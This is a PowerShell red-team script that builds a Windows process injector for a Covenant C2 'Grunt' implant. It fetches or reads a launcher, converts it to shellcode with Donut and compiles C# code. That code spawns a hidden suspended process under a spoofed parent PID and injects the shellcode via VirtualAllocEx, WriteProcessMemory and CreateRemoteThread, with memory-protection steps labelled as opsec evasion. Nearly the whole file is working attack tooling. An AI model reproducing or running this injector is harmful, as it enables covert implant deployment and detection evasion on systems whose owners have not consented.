<#
    .SYNOPSIS
        Takes a compiled .NET assembly and produces a .NET assembly that injects
        the original .NET assembly into a new arbitrary process with an arbitrary
        PPID.
    .EXAMPLE
        From a binary launcher hosted on a Covenant server:
        Generate-GruntInjector.ps1 -LauncherURL https://mycovenantserver.com/launcher40

        From a binary launcher on disk:
        Generate-GruntInjector.ps1 -InputFile launcher40.exe

        Specify the path to Donut:
        Generate-GruntInjector.ps1 -InputFile launcher40.exe -DonutPath C:\Users\tgihf\Source\repos\donut.donut.exe

        Specify .NET framework version to compile the injector against:
        (either 3.5 or 4.0. This should be the same as the version the launcher was compiled against.)
        Generate-GruntInjector.ps1 -InputFile launcher40.exe -DotNetFrameworkVersion 3.5

        Specify an output file (defaults to .\GruntInjector_<timestamp>_v<.NET framework version>.exe)
        Generate-GruntInjector.ps1 -InputFile launcher40.exe -OutFile injector.exe

    .LINK
        This is merely an automation of Rasta Mouse's Covenant process injection technique described
        in this blog post: 
            https://rastamouse.me/2019/08/covenant-donut-tikitorch/
        This script relies on Donut's ability to turn an arbitrary .NET assembly into shellcode:
            https://github.com/TheWover/donut
#>
[CmdletBinding()]
param(

    # URL of the Grunt binary launcher
    # Example: "https://mycovenantserver.com/launcher40"
    [Parameter(Mandatory = $false)]
    [String]
    $LauncherURL,

    # Path to the Grunt binary launcher executable
    # Example: "C:\Users\tgihf\Workspace\launcher40.exe"
    [Parameter(Mandatory = $false)]
    [String]
    $InputFile,

    # .NET Framework version
    # Example: "4.0"
    # Other example: "3.5"
    [Parameter(Mandatory = $false)]
    [String]
    $DotNetFrameworkVersion = "4.0",

    # Path to Donut, defaults to just "donut" (assumes on PATH)
    # Example: "C:\Users\tgihf\Sources\repos\donut\donut.exe"
    [Parameter(Mandatory = $false)]
    [String]
    $DonutPath = "donut",

    # Path to write the injector assembly to
    # Defaults to ".\GruntInjector_<timestamp>_v<.NET framework version>.exe"
    # Example: "C:\Windows\Temp\injector.exe"
    [Parameter(Mandatory = $false)]
    [String]
    $Outfile = "$(Get-Location)\GruntInjector_$(Get-Date -Format `
        "yyyy-MM-dd_HH.mm.ss")_v$DotNetFrameworkVersion.exe",

    [Parameter(Mandatory = $false)]
    [Alias("h")]
    [Switch]
    $Help
)
begin {
    "[*] Generate-GruntInjector.ps1"
    if ($Help) {
        "[*] Flags:"
        "[**] -LauncherURL"
        "[***] Description: URL of the Grunt binary launcher"
        "[***] Example: -LauncherURL https://covenantserver.com/launcher40"
        ""
        "[**] -InputFile"
        "[***] Description: Path to the Grunt binary launcher executable"
        "[***] Example: -InputFile C:\Users\tgihf\Workspace\launcher40.exe"
        ""
        "[**] -DotNetFrameworkVersion"
        "[***] Description: .NET Framework version to compile the injector against (4.0 or 3.5)"
        "[***] Defaults to: 4.0"
        "[***] Gotcha: this should be the same version that the Grunt launcher was compiled against"
        "[***] Example: -DotNetFrameworkVersion 3.5"
        ""
        "[**] -DonutPath"
        "[***] Description: Path to donut.exe"
        "[***] Defaults to: donut.exe"
        "[***] Example: -DonutPath C:\Users\tgihf\Source\repos\donut\donut.exe"
        ""
        "[**] -OutFile"
        "[***] Description: Path to output the injector assembly to"
        "[***] Defaults to: .\GruntInjector_<timestamp>_v<.NET Framework version>.exe"
        "[***] Example: -OutFile C:\Users\tgihf\Workspace\injector.exe"
        exit
    }
    if (-not ($LauncherURL -or $InputFile)) {
        throw "[!] Must specify LauncherURL or InputFile"
    }
    if (@("3.5", "4.0") -notcontains $DotNetFrameworkVersion) {
        throw "[!] Invalid .NET Framework Version: should be 3.5 or 4.0"
    }
    $ErrorActionPreference = "Stop"
    $LauncherAssemblyPath = "$(Get-Location)\GruntLauncher.exe"
    $LauncherShellcodePath = "$(Get-Location)\GruntLauncher.bin"
}
process {

    # Download Grunt binary launcher for Covenant server or assign file path from input file
    if ($LauncherURL) {
        "[*] Downloading binary launcher"
        $LauncherAssembly = (New-Object Net.WebClient).DownloadFile($LauncherURL, $LauncherAssemblyPath)
    }
    else {
        $LauncherAssemblyPath = $InputFile
    }

    # Use Donut to translate the binary launcher on disk into shellcode
    "[*] Converting binary launcher to shellcode"
    Invoke-Expression -Command "& '$DonutPath' $LauncherAssemblyPath -o $LauncherShellcodePath" | Out-Null

    # Base 64 encode shellcode
    $Base64Shellcode = ([System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("$LauncherShellcodePath")))

    # Insert base 64 encoded shellcode into GruntInjector.cs
    "[*] Inserting shellcode into injector source"
    $GruntInjectorSource = @"
    using System;
    using System.Diagnostics;
    using System.Runtime.InteropServices;

    namespace GruntInjection
    {
        class Program
        {
            public const uint CreateSuspended = 0x00000004;
            public const uint DetachedProcess = 0x00000008;
            public const uint CreateNoWindow = 0x08000000;
            public const uint ExtendedStartupInfoPresent = 0x00080000;
            public const int ProcThreadAttributeParentProcess = 0x00020000;

            // Hardcoded Grunt Stage
            public static byte[] gruntStager = Convert.FromBase64String("$Base64Shellcode");

            static void Main(string[] args)
            {
                if (args.Length < 2)
                {
                    Console.Error.WriteLine("Invalid number of args");
                    return;
                }

                // Create new process
                PROCESS_INFORMATION pInfo = CreateTargetProcess(args[0], int.Parse(args[1]));

                // Allocate memory (RW for opsec)
                IntPtr allocatedRegion = VirtualAllocEx(pInfo.hProcess, IntPtr.Zero, (uint)gruntStager.Length, AllocationType.Commit | AllocationType.Reserve, MemoryProtection.ReadWrite);

                // Copy Grunt PIC to new process
                UIntPtr bytesWritten;
                WriteProcessMemory(pInfo.hProcess, allocatedRegion, gruntStager, (uint)gruntStager.Length, out bytesWritten);

                // Change memory region to RX (opsec)
                MemoryProtection oldProtect;
                VirtualProtectEx(pInfo.hProcess, allocatedRegion, (uint)gruntStager.Length, MemoryProtection.ExecuteRead, out oldProtect);

                // Create new thread
                CreateRemoteThread(pInfo.hProcess, IntPtr.Zero, 0, allocatedRegion, IntPtr.Zero, 0, IntPtr.Zero);
            }

            public static PROCESS_INFORMATION CreateTargetProcess(string targetProcess, int parentProcessId)
            {
                STARTUPINFOEX sInfo = new STARTUPINFOEX();
                PROCESS_INFORMATION pInfo = new PROCESS_INFORMATION();

                sInfo.StartupInfo.cb = (uint)Marshal.SizeOf(sInfo);
                IntPtr lpValue = IntPtr.Zero;

                try
                {
                    SECURITY_ATTRIBUTES pSec = new SECURITY_ATTRIBUTES();
                    SECURITY_ATTRIBUTES tSec = new SECURITY_ATTRIBUTES();
                    pSec.nLength = Marshal.SizeOf(pSec);
                    tSec.nLength = Marshal.SizeOf(tSec);

                    uint flags = CreateSuspended | DetachedProcess | CreateNoWindow | ExtendedStartupInfoPresent;

                    IntPtr lpSize = IntPtr.Zero;

                    InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref lpSize);
                    sInfo.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    InitializeProcThreadAttributeList(sInfo.lpAttributeList, 1, 0, ref lpSize);

                    IntPtr parentHandle = Process.GetProcessById(parentProcessId).Handle;
                    lpValue = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValue, parentHandle);

                    UpdateProcThreadAttribute(sInfo.lpAttributeList, 0, (IntPtr)ProcThreadAttributeParentProcess, lpValue, (IntPtr)IntPtr.Size, IntPtr.Zero, IntPtr.Zero);

                    CreateProcess(targetProcess, null, ref pSec, ref tSec, false, flags, IntPtr.Zero, null, ref sInfo, out pInfo);

                    return pInfo;

                }
                finally
                {
                    DeleteProcThreadAttributeList(sInfo.lpAttributeList);
                    Marshal.FreeHGlobal(sInfo.lpAttributeList);
                    Marshal.FreeHGlobal(lpValue);
                }
            }

            [DllImport("kernel32.dll")]
            public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

            [DllImport("kernel32.dll", SetLastError = true)]
            public static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

            [DllImport("kernel32.dll")]
            public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, AllocationType flAllocationType, MemoryProtection flProtect);

            [DllImport("kernel32.dll", SetLastError = true)]
            static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);

            [DllImport("kernel32.dll")]
            static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, MemoryProtection flNewProtect, out MemoryProtection lpflOldProtect);

            [DllImport("kernel32.dll", SetLastError = true, CallingConvention = CallingConvention.StdCall)]
            public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            [StructLayout(LayoutKind.Sequential)]
            public struct STARTUPINFOEX
            {
                public STARTUPINFO StartupInfo;
                public IntPtr lpAttributeList;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct STARTUPINFO
            {
                public uint cb;
                public IntPtr lpReserved;
                public IntPtr lpDesktop;
                public IntPtr lpTitle;
                public uint dwX;
                public uint dwY;
                public uint dwXSize;
                public uint dwYSize;
                public uint dwXCountChars;
                public uint dwYCountChars;
                public uint dwFillAttributes;
                public uint dwFlags;
                public ushort wShowWindow;
                public ushort cbReserved;
                public IntPtr lpReserved2;
                public IntPtr hStdInput;
                public IntPtr hStdOutput;
                public IntPtr hStdErr;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct PROCESS_INFORMATION
            {
                public IntPtr hProcess;
                public IntPtr hThread;
                public int dwProcessId;
                public int dwThreadId;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct SECURITY_ATTRIBUTES
            {
                public int nLength;
                public IntPtr lpSecurityDescriptor;
                public int bInheritHandle;
            }

            [Flags]
            public enum AllocationType
            {
                Commit = 0x1000,
                Reserve = 0x2000,
                Decommit = 0x4000,
                Release = 0x8000,
                Reset = 0x80000,
                Physical = 0x400000,
                TopDown = 0x100000,
                WriteWatch = 0x200000,
                LargePages = 0x20000000
            }

            [Flags]
            public enum MemoryProtection
            {
                Execute = 0x10,
                ExecuteRead = 0x20,
                ExecuteReadWrite = 0x40,
                ExecuteWriteCopy = 0x80,
                NoAccess = 0x01,
                ReadOnly = 0x02,
                ReadWrite = 0x04,
                WriteCopy = 0x08,
                GuardModifierflag = 0x100,
                NoCacheModifierflag = 0x200,
                WriteCombineModifierflag = 0x400
            }
        }
    }
"@

    # Compile injector source code
    "[*] Compiling injector source under csc.exe, .NET Framework v$DotNetFrameworkVersion"
    $CompilerOptions = New-Object "System.Collections.Generic.Dictionary``2[System.String, System.String]"
    $CompilerOptions.Add("CompilerVersion", "v$DotNetFrameworkVersion")
    $Provider = New-Object Microsoft.CSharp.CSharpCodeProvider $CompilerOptions
    $CompilerParameters = New-Object System.CodeDom.Compiler.CompilerParameters
    $CompilerParameters.ReferencedAssemblies.Add("System.dll") | Out-Null
    $CompilerParameters.GenerateExecutable = $true 
    $CompilerParameters.OutputAssembly = $Outfile
    $Result = $Provider.CompileAssemblyFromSource($CompilerParameters, $GruntInjectorSource)
    if ($Result.Errors) {
        ForEach ($Error in $Result.Errors) {
            "[!] $Error in compilation: $Error"
        }
    }
    else {
        "[*] Success!"
        "[*] Path to injector: $($Result.PathToAssembly)"
    }
}
end {
    "[*] Cleaning up..."
    if (-not $InputFile) {
        Remove-Item -Path $LauncherAssemblyPath
    }
    Remove-Item -Path $LauncherShellcodePath
    "[*] Done!"
}